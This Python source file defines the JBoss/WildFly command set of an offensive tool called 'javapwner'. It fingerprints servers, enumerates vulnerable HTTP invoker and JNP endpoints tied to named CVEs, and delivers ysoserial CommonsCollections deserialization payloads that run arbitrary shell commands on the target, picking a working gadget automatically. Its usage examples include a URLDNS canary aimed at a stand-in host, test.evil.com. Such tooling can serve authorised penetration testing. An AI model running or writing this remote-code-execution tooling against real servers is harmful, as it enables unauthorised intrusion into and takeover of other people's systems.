"""Click sub-commands for the JBoss / WildFly module.

Commands:
  javapwner jboss scan    -t HOST [-p PORT]     ← fingerprint + invoker enum
  javapwner jboss exploit -t HOST -p PORT --gadget NAME --cmd CMD
  javapwner jboss jnp-scan -t HOST [-p PORT]    ← JNP/JNDI enumeration
  javapwner jboss info    -t HOST [-p PORT]     ← detailed fingerprint info
"""

from __future__ import annotations

import sys

import click

from javapwner.core.output import OutputFormatter
from javapwner.exceptions import JavaPwnerError, PayloadError
from javapwner.protocols.jboss.scanner import JBossScanner
from javapwner.protocols.jboss.invoker import HttpInvoker
from javapwner.protocols.jboss.jnp import JnpExploiter, JnpScanner
from javapwner.protocols.jboss.remoting3 import JBossRemoting3Fingerprinter

DEFAULT_PORT = 8080


def _get_fmt(ctx: click.Context) -> OutputFormatter:
    return ctx.obj["formatter"]


def _get_timeout(ctx: click.Context) -> float:
    return ctx.obj.get("timeout", 5.0)


def _get_ysoserial(ctx: click.Context) -> str | None:
    return ctx.obj.get("ysoserial_path")


@click.group()
def jboss() -> None:
    """JBoss / WildFly protocol commands."""


# ---------------------------------------------------------------------------
# scan
# ---------------------------------------------------------------------------

@jboss.command("scan")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the JBoss HTTP interface.")
@click.option("--https", "use_https", is_flag=True, default=False,
              help="Use HTTPS instead of HTTP.")
@click.option("--urldns", "urldns_canary", default=None, metavar="URL",
              help="Send a URLDNS ysoserial payload via each reachable invoker to detect "
                   "blind deserialization (check DNS logs for resolution).")
@click.pass_context
def scan_cmd(
    ctx: click.Context, target: str, port: int, use_https: bool,
    urldns_canary: str | None,
) -> None:
    """Fingerprint a JBoss / WildFly endpoint and enumerate exploit surface.

    \b
    Steps performed:
      1. HTTP banner — identify product version from headers + body
      2. HTTP invoker paths — probe for CVE-2015-7501 / CVE-2017-12149 / CVE-2017-7504
         and Spring HTTP Invoker deserialization paths
      3. Binary remoting — check for JBoss Remoting 2 GREETING magic (port 4446)

    \b
    Examples:
      javapwner jboss scan -t 10.0.0.5
      javapwner jboss scan -t 10.0.0.5 -p 8443 --https
      javapwner jboss scan -t 10.0.0.5 --urldns 'test.evil.com'
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    scanner = JBossScanner(timeout=timeout)
    scheme = "https" if use_https else "http"

    with fmt.status(f"Scanning {target}:{port}…"):
        try:
            result = scanner.scan(target, port, scheme=scheme, urldns_canary=urldns_canary)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.is_open:
        fmt.error(f"Port {port} is closed or filtered: {result.error}")
        sys.exit(1)

    # Fingerprint
    fmt.section("Fingerprint")
    fp = result.fingerprint
    if fp and fp.is_jboss:
        fmt.success(f"JBoss / WildFly detected")
        if fp.version:
            fmt.info(f"  Version  : {fp.version}")
        if fp.product:
            fmt.info(f"  Product  : {fp.product}")
        if fp.banner:
            banner_line = fp.banner.split("\n")[0][:80]
            fmt.info(f"  Banner   : {banner_line!r}")
        if fp.remoting2_confirmed:
            fmt.success("  Remoting2 GREETING confirmed (binary protocol)")
    elif fp:
        fmt.info("No JBoss-specific indicators in the response.")
    else:
        fmt.warning("Fingerprint failed.")

    # Invoker endpoints
    fmt.section("HTTP Invoker Endpoints")
    if result.invoker_endpoints:
        for path in result.invoker_endpoints:
            cve = next(
                (c for p, c in {
                    "/invoker/JMXInvokerServlet": "CVE-2015-7501",
                    "/invoker/EJBInvokerServlet": "CVE-2017-7504",
                    "/invoker/readonly": "CVE-2017-12149",
                }.items() if p == path),
                None,
            )
            cve_str = f"  [{cve}]" if cve else ""
            fmt.success(f"  FOUND: http://{target}:{port}{path}{cve_str}")
        fmt.warning(
            f"\n  {len(result.invoker_endpoints)} vulnerable endpoint(s) found. "
            "Run 'javapwner jboss exploit' to test RCE."
        )
    else:
        fmt.info("No reachable HTTP invoker endpoints found.")

    # URLDNS canary
    if result.urldns_sent:
        fmt.section("URLDNS Canary")
        fmt.success(f"URLDNS payload sent — canary: {result.urldns_canary}")
        fmt.info("  Check your DNS server logs for resolution.")

    if result.error:
        fmt.warning(f"Partial error: {result.error}")


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------

@jboss.command("exploit")
@click.option("-t", "--target", required=True, metavar="HOST")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
@click.option("--gadget", required=False, default=None, metavar="NAME",
              help="ysoserial gadget chain name (e.g. CommonsCollections1). "
                   "Auto-detected if omitted.")
@click.option("--cmd", "command", required=True, metavar="CMD",
              help="Shell command to execute on the target.")
@click.option("--path", "invoker_path", default=None, metavar="PATH",
              help="Specific invoker path (auto-detected if not given).")
@click.option("--https", "use_https", is_flag=True, default=False,
              help="Use HTTPS instead of HTTP.")
@click.pass_context
def exploit_cmd(
    ctx: click.Context,
    target: str,
    port: int,
    gadget: str | None,
    command: str,
    invoker_path: str | None,
    use_https: bool,
) -> None:
    """Deliver a ysoserial payload via JBoss HTTP invoker (CVE-2015-7501 etc.).

    Posts a raw serialised Java object to the JBoss HTTP invoker endpoint.
    The server deserialises the body and executes the embedded gadget chain.

    When --gadget is omitted the tool tries gadgets in priority order and
    stops on the first one that produces a likely_success response.

    \b
    Classic gadget chains for JBoss:
      CommonsCollections1  — JBoss 4.x / JDK ≤ 7
      CommonsCollections6  — JBoss 5.x/6.x / JDK 8

    \b
    Examples:
      javapwner jboss exploit -t 10.0.0.5 --cmd 'id'
      javapwner jboss exploit -t 10.0.0.5 --gadget CommonsCollections1 --cmd 'id'
      javapwner jboss exploit -t 10.0.0.5 --gadget CommonsCollections6 --cmd 'id' \\
                              --path /invoker/readonly
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    jar = _get_ysoserial(ctx)

    invoker = HttpInvoker(timeout=timeout, scheme="https" if use_https else "http")

    if gadget is None:
        fmt.info(
            f"No gadget specified — trying gadgets in priority order on {target}:{port}…"
        )
        with fmt.status("Finding compatible gadget…"):
            used, result = invoker.auto_exploit(
                target, port, command, path=invoker_path, jar_path=jar
            )
        if used:
            fmt.info(f"Using gadget: {used}")
        else:
            fmt.error(
                f"No gadget produced a successful response on {target}:{port}. "
                "Verify the target is reachable and CommonsCollections is in its classpath."
            )
            if fmt.json_mode:
                fmt.print_json(result.to_dict())
            sys.exit(1)
    else:
        fmt.info(
            f"Exploiting {target}:{port} via HTTP invoker "
            f"with gadget '{gadget}' → {command!r}"
        )
        try:
            from javapwner.core.payload import YsoserialWrapper
            wrapper = YsoserialWrapper(jar_path=jar)
            payload = wrapper.generate(gadget, command)
        except PayloadError as exc:
            fmt.error(str(exc))
            sys.exit(1)
        try:
            result = invoker.exploit(target, port, payload, path=invoker_path)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.error and not result.sent:
        fmt.error(f"Exploit failed: {result.error}")
        sys.exit(1)

    fmt.info(f"  Endpoint    : {result.endpoint}")
    fmt.info(f"  HTTP status : {result.http_status}")

    if result.likely_success:
        fmt.success("Payload likely executed (HTTP 500 = server-side error after deserialisation).")
    elif result.sent:
        fmt.info(f"Payload sent (HTTP {result.http_status}) — verify out-of-band.")
    else:
        fmt.error("Payload was not sent.")

    if result.response_text and fmt.verbose:
        fmt.info(f"  Response: {result.response_text[:200]!r}")


# ---------------------------------------------------------------------------
# jnp-scan
# ---------------------------------------------------------------------------

@jboss.command("jnp-scan")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=4444, show_default=True, type=int,
              metavar="PORT", help="TCP port of the JNP service (default 4444).")
@click.pass_context
def jnp_scan_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Probe a JBoss JNP (JNDI) endpoint.

    JNP (Java Naming Protocol) is JBoss AS 4.x–6.x's JNDI service.
    It runs standard JRMP on port 4444 and exposes the full JNDI tree.

    \b
    Examples:
      javapwner jboss jnp-scan -t 10.0.0.5
      javapwner jboss jnp-scan -t 10.0.0.5 -p 1099
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    scanner = JnpScanner(timeout=timeout)

    with fmt.status(f"Scanning JNP on {target}:{port}…"):
        try:
            result = scanner.scan(target, port)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.is_open:
        fmt.error(f"Port {port} is closed or filtered: {result.error}")
        sys.exit(1)

    if result.is_jnp:
        fmt.success("JNP service detected")
        if result.bound_names:
            fmt.info(f"  Bound names ({len(result.bound_names)}):")
            for name in result.bound_names:
                fmt.info(f"    {name}")
        fmt.warning(
            "JNP endpoint may be vulnerable to deserialization RCE. "
            "Run 'javapwner jboss jnp-exploit' to test."
        )
    else:
        fmt.info("No JNP service detected on this port.")


# ---------------------------------------------------------------------------
# jnp-exploit
# ---------------------------------------------------------------------------

@jboss.command("jnp-exploit")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=4444, show_default=True, type=int,
              metavar="PORT", help="TCP port of the JNP service.")
@click.option("--gadget", required=False, default=None, metavar="NAME",
              help="ysoserial gadget chain (e.g. CommonsCollections1). "
                   "Auto-detected if omitted.")
@click.option("--cmd", "command", required=True, metavar="CMD",
              help="Shell command to execute on the target.")
@click.pass_context
def jnp_exploit_cmd(
    ctx: click.Context, target: str, port: int, gadget: str | None, command: str
) -> None:
    """Deliver a ysoserial payload via JBoss JNP DGC dirty().

    JNP runs on standard JRMP — the DGC endpoint is always present and
    deserialises without JEP 290 filtering on JBoss AS 4.x–6.x.

    When --gadget is omitted the tool tries gadgets in priority order and
    stops on the first one that produces a likely_success response.

    \b
    Classic gadgets:
      CommonsCollections1  — JBoss AS 4.x / JDK ≤ 7
      CommonsCollections6  — JBoss AS 5.x/6.x / JDK 8

    \b
    Examples:
      javapwner jboss jnp-exploit -t 10.0.0.5 --cmd 'id'
      javapwner jboss jnp-exploit -t 10.0.0.5 --gadget CommonsCollections1 --cmd 'id'
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    jar = _get_ysoserial(ctx)

    exploiter = JnpExploiter(timeout=timeout, jar_path=jar)

    if gadget is None:
        fmt.info(
            f"No gadget specified — trying gadgets in priority order on {target}:{port}…"
        )
        with fmt.status("Finding compatible gadget…"):
            used, result = exploiter.auto_exploit(target, port, command, jar_path=jar)
        if used:
            fmt.info(f"Using gadget: {used}")
        else:
            fmt.error(
                f"No gadget produced a successful response on {target}:{port}. "
                "Verify the target is reachable and the classpath contains a supported library."
            )
            if fmt.json_mode:
                fmt.print_json(result.to_dict())
            sys.exit(1)
    else:
        fmt.info(f"Exploiting {target}:{port} via JNP DGC with gadget '{gadget}' → {command!r}")
        try:
            result = exploiter.exploit_gadget(target, port, gadget, command)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.error and not result.sent:
        fmt.error(f"Exploit failed: {result.error}")
        sys.exit(1)

    if result.likely_success:
        fmt.success("Payload delivered — likely executed (no exception / connection reset).")
    elif result.sent:
        fmt.info("Payload sent — verify out-of-band.")
    else:
        fmt.error("Payload was not sent.")


# ---------------------------------------------------------------------------
# info
# ---------------------------------------------------------------------------

@jboss.command("info")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the JBoss HTTP interface.")
@click.option("--https", "use_https", is_flag=True, default=False,
              help="Use HTTPS instead of HTTP.")
@click.pass_context
def info_cmd(ctx: click.Context, target: str, port: int, use_https: bool) -> None:
    """Show detailed information about a JBoss endpoint.

    \b
    Examples:
      javapwner jboss info -t 10.0.0.5
      javapwner jboss info -t 10.0.0.5 --https
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    scheme = "https" if use_https else "http"

    scanner = JBossScanner(timeout=timeout)

    with fmt.status(f"Gathering info on {target}:{port}…"):
        try:
            result = scanner.scan(target, port, scheme=scheme)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.is_open:
        fmt.error(f"Port {port} is closed or filtered: {result.error}")
        sys.exit(1)

    fmt.section("JBoss Endpoint Info")
    fp = result.fingerprint
    if fp:
        fmt.info(f"  Scheme   : {fp.scheme}")
        fmt.info(f"  Product  : {fp.product or 'unknown'}")
        fmt.info(f"  Version  : {fp.version or 'unknown'}")
        fmt.info(f"  Edition  : {fp.edition or 'unknown'}")
        fmt.info(f"  Remoting2: {'yes' if fp.remoting2_confirmed else 'no'}")

    fmt.section("Invoker Endpoints")
    if fp and fp.invoker_probes:
        for probe in fp.invoker_probes:
            status = "OPEN" if probe.reachable and not probe.requires_auth else \
                     "AUTH" if probe.requires_auth else "closed"
            cve_str = f" [{probe.cve}]" if probe.cve else ""
            fmt.info(f"  {probe.path} : {status} (HTTP {probe.http_status}){cve_str}")
    elif result.invoker_endpoints:
        for ep in result.invoker_endpoints:
            fmt.info(f"  {ep}")
    else:
        fmt.info("  None found")

    # Remoting 3 probe
    fmt.section("Remoting 3")
    r3 = JBossRemoting3Fingerprinter(timeout=timeout)
    try:
        r3_result = r3.fingerprint(target, port)
        if r3_result.is_remoting3:
            fmt.success(f"  Remoting 3 detected ({r3_result.channel_type or 'native'})")
        else:
            fmt.info(f"  Not detected ({r3_result.error or 'no response'})")
    except Exception:
        fmt.info("  Probe failed")
